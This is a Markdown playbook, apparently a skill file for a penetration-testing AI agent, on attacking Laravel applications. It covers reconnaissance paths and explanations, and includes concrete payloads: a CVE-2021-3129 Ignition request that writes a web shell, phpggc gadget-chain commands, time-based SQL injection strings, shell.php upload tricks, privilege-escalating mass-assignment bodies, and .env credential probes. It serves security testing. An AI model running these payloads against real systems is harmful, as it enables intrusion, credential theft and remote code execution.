<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: laravel
description: Security testing playbook for Laravel applications covering debug mode, route enumeration, mass assignment, deserialization, and Laravel-specific misconfigurations
---

# Laravel Security Testing

Laravel is the dominant PHP web framework. Attack surface: debug mode (Ignition), exposed routes, mass assignment via Eloquent, PHP object deserialization, CSRF bypass, file upload, and common config exposures.

---

## Reconnaissance

### Fingerprinting Laravel

    # Laravel-specific paths
    GET /_ignition/health-check        # Confirms Laravel + version (Ignition error handler)
    GET /telescope                     # Laravel Telescope (debug dashboard)
    GET /telescope/requests            # HTTP requests log
    GET /horizon                       # Laravel Horizon (queue monitor)
    GET /nova                          # Laravel Nova (admin panel)
    GET /api/documentation             # L5-Swagger docs
    GET /storage/logs/laravel.log      # Log file exposure

    # Headers
    Set-Cookie: laravel_session=...    # Session cookie name
    X-Powered-By: PHP/...

    # Error pages: Ignition shows full stack trace, local variables, file contents
    GET /nonexistent-url               # 404 with Laravel branding
    POST /any-route-no-csrf            # 419 Page Expired (CSRF failure) confirms Laravel

---

## Debug Mode (Critical — APP_DEBUG=true)

    # Ignition remote code execution (CVE-2021-3129)
    # Only affects Laravel < 8.4.2 with Ignition < 2.5.2
    POST /_ignition/execute-solution
    Content-Type: application/json
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.base64-decode/resource=../public/shell.php"
      }
    }

    # Check if Ignition endpoint is accessible:
    curl -s <target>/_ignition/health-check

    # APP_DEBUG leaks: full stack trace, environment variables, DB credentials, APP_KEY
    # Trigger 500: send malformed input to any endpoint

---

## Route Enumeration

    # artisan route:list output exposed (common misconfiguration)
    GET /routes                     # Sometimes developers expose this
    GET /api/routes

    # Common Laravel route patterns
    GET  /api/user                  # Auth user info (requires token)
    POST /api/login
    POST /api/register
    GET  /api/logout
    GET  /sanctum/csrf-cookie       # Laravel Sanctum CSRF initialization
    POST /oauth/token               # Laravel Passport OAuth
    GET  /oauth/authorize

    # Fuzz API versions
    GET /api/v1/
    GET /api/v2/

---

## Mass Assignment (Eloquent)

Laravel Eloquent `$fillable` vs `$guarded` controls mass assignment:

    # Dangerous: $guarded = [] or no fillable restriction
    # Test: inject extra fields in any POST/PUT request

    # User registration → add admin fields
    POST /api/register
    {"name": "attacker", "email": "a@b.com", "password": "pass", "role": "admin", "is_admin": 1}

    # Profile update → elevate privileges
    PUT /api/profile
    {"name": "me", "email": "a@b.com", "admin": true, "role_id": 1}

    # Check response — if extra fields are reflected or accepted without error, mass assignment works

---

## CSRF

    # Laravel uses CSRF tokens for all state-changing requests
    # Token stored in session + X-XSRF-TOKEN cookie

    # Bypass techniques:
    # 1. Routes excluded from VerifyCsrfToken middleware (check routes/web.php leaks)
    # 2. API routes are CSRF-exempt by default in routes/api.php
    # 3. Content-Type: application/json bypass (some middleware configs)
    # 4. X-XSRF-TOKEN header: read from cookie (requires cookie access = XSS or subdomain)

    # Exploit: API routes don't require CSRF
    POST /api/any-state-changing-action   # No CSRF needed

---

## PHP Object Deserialization

Laravel uses serialize/unserialize in session handling and cache:

    # Laravel APP_KEY needed to forge encrypted payloads
    # If APP_KEY leaked (from debug page or .env):
    # Use phpggc to generate gadget chains

    phpggc Laravel/RCE1 system 'id' | base64    # Generate payload
    phpggc Laravel/RCE2 system 'id'
    phpggc -l | grep Laravel                     # List available gadget chains

    # Vulnerable if using file/cookie session driver with old Laravel
    # Forge Laravel session cookie using leaked APP_KEY

    # CVE-2018-15133: Unserialize in X-XSRF-TOKEN header (old versions)

---

## SQL Injection

    # Eloquent ORM is parameterized by default, but raw queries exist:

    # Vulnerable patterns:
    DB::select("SELECT * FROM users WHERE id = " . $id);
    Model::whereRaw("name = '" . $name . "'");
    Model::orderByRaw($column);    # Order-by injection

    # Safe patterns:
    DB::select("SELECT * FROM users WHERE id = ?", [$id]);
    Model::where('name', $name);

    # Order-by injection (common Laravel pattern):
    GET /api/users?sort=name` ASC,(SELECT SLEEP(5))--
    GET /api/products?order_by=price`,(SELECT 1 FROM (SELECT SLEEP(5))x)--

---

## File Upload

    # Laravel file handling via Storage facade
    # Test upload endpoints:
    POST /api/upload   filename="shell.php"  Content-Type: image/jpeg   [PHP payload]
    POST /api/upload   filename="shell.php%00.jpg"   # Null byte injection

    # Path traversal in filename:
    filename="../../../public/shell.php"

    # Storage misconfigurations:
    GET /storage/<uploaded-file>    # storage:link exposes storage/app/public to /storage/
    # Brute-force uploaded file paths if predictable names

    # Check if MIME validation is server-side only:
    Content-Type: image/jpeg + PHP payload = often accepted

---

## Environment File Exposure

    # Critical: .env contains APP_KEY, DB credentials, API keys
    GET /.env
    GET /.env.backup
    GET /.env.production
    GET /.env.local
    GET /config/database.php    # If not protected

    # APP_KEY format: base64:<32-byte-key>
    # Used for: encrypted cookies, session tokens, signed URLs

    # Laravel log file
    GET /storage/logs/laravel.log
    GET /storage/logs/laravel-2024-01-01.log    # Date-based logs

---

## Laravel Telescope (Admin Debug Dashboard)

    # Telescope exposed in production = critical
    GET /telescope
    GET /telescope/requests          # All HTTP requests with parameters
    GET /telescope/commands          # Artisan commands executed
    GET /telescope/queries           # All SQL queries with full parameters
    GET /telescope/exceptions        # Error logs with stack traces
    GET /telescope/models            # Eloquent model changes
    GET /telescope/mail              # Emails sent (may include tokens)
    GET /telescope/jobs              # Queue jobs

    # Telescope API (JSON)
    GET /telescope/telescope-api/requests

---

## Laravel Horizon / Nova

    # Horizon: queue job dashboard
    GET /horizon
    GET /horizon/api/stats
    GET /horizon/api/jobs/pending

    # Nova: admin panel (paid package)
    GET /nova
    GET /nova/login
    GET /nova/api/resources/users    # User management API

---

## Authentication

    # Sanctum API token exposure
    GET /sanctum/csrf-cookie         # Initialize Sanctum

    # Passport OAuth misconfigs
    POST /oauth/token
    {"grant_type": "client_credentials", "client_id": 1, "client_secret": "..."}

    # Login response: check if password_confirm bypasses required re-auth
    # Remember me token: very long-lived, check expiry

    # Account enumeration via login response timing / different messages

---

## IDOR via Route Model Binding

    # Laravel route model binding uses sequential integers by default
    GET /api/invoices/1
    GET /api/invoices/2     # Different user's invoice?

    # UUIDs — still test: check if authorization validates ownership
    GET /api/documents/550e8400-e29b-41d4-a716-446655440000

---

## Pro Tips

1. Always check `/_ignition/health-check` — confirms version and if debug is on
2. `.env` exposure is the most critical Laravel finding — check exhaustively
3. Telescope in production = full application audit trail (queries, requests, emails)
4. API routes (`/api/*`) are CSRF-exempt by default — any state-changing action is CSRF-vulnerable
5. `APP_KEY` leak enables session forgery, encrypted field decryption, signed URL forgery
6. Mass assignment on user registration is extremely common — always add `role`/`is_admin` fields
7. `storage/` directory exposure via `php artisan storage:link` — uploaded files accessible publicly

## Summary

Laravel testing = debug mode + .env exposure + Telescope dashboard + CSRF on API routes + mass assignment via Eloquent. APP_KEY is the crown jewel — it enables forgery of every cryptographic primitive in Laravel. Telescope in production is a free application audit log.
